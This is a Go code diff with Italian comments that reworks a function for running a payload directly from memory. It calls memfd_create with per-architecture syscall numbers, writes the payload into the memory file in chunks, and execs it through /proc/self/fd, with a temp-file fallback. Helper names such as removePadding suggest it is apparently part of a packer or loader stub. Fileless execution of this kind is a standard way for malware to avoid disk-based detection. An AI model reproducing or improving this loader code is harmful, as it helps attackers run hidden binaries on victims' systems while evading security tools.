@@ -194,14 +194,70 @@ func removePadding(data []byte, offsets []int) []byte {
 // executeInMemory esegue il payload direttamente dalla memoria usando memfd_create
 func executeInMemory(payload []byte) {
 	// memfd_create syscall (Linux 3.17+)
-	fd, _, _ := syscall.Syscall(319, uintptr(unsafe.Pointer(&[]byte("payload\x00")[0])), 0, 0)
+	// Syscall numbers per architettura:
+	// - x86_64: 319
+	// - ARM64: 279
+	// - ARM: 385
+	var memfdSyscall uintptr
+	switch runtime.GOARCH {
+	case "arm64":
+		memfdSyscall = 279
+	case "arm":
+		memfdSyscall = 385
+	default: // x86_64, amd64
+		memfdSyscall = 319
+	}
 	
-	// Scrivi payload nel memfd
-	syscall.Write(int(fd), payload)
+	name := []byte("exec\x00")
 	
-	// Esegui con fexecve
-	fdPath := "/proc/self/fd/" + string(rune(fd))
-	syscall.Exec(fdPath, os.Args, os.Environ())
+	// MFD_CLOEXEC = 1
+	fd, _, errno := syscall.Syscall(memfdSyscall, uintptr(unsafe.Pointer(&name[0])), 1, 0)
+	if errno != 0 {
+		// Fallback to temp file if memfd_create not available
+		executeFromTemp(payload)
+		return
+	}
+	defer syscall.Close(int(fd))
+	
+	// Scrivi payload nel memfd in chunks (gestisce write parziali)
+	totalWritten := 0
+	for totalWritten < len(payload) {
+		n, err := syscall.Write(int(fd), payload[totalWritten:])
+		if err != nil {
+			executeFromTemp(payload)
+			return
+		}
+		if n <= 0 {
+			executeFromTemp(payload)
+			return
+		}
+		totalWritten += n
+	}
+	
+	// Costruisci path /proc/self/fd/N usando fmt.Sprintf equivalente manuale
+	// Per evitare import fmt, convertiamo fd in stringa manualmente
+	fdNum := int(fd)
+	fdStr := ""
+	if fdNum == 0 {
+		fdStr = "0"
+	} else {
+		digits := []byte{}
+		for fdNum > 0 {
+			digits = append([]byte{byte('0' + fdNum%10)}, digits...)
+			fdNum /= 10
+		}
+		fdStr = string(digits)
+	}
+	fdPath := "/proc/self/fd/" + fdStr
+	
+	// Esegui il binary dal memfd
+	// syscall.Exec rimpiazza il processo corrente con il nuovo binary
+	err := syscall.Exec(fdPath, os.Args, os.Environ())
+	
+	// Se arriviamo qui, Exec ha fallito - fallback
+	if err != nil {
+		executeFromTemp(payload)
+	}
 }
 
 // executeFromTemp esegue il payload da file temporaneo
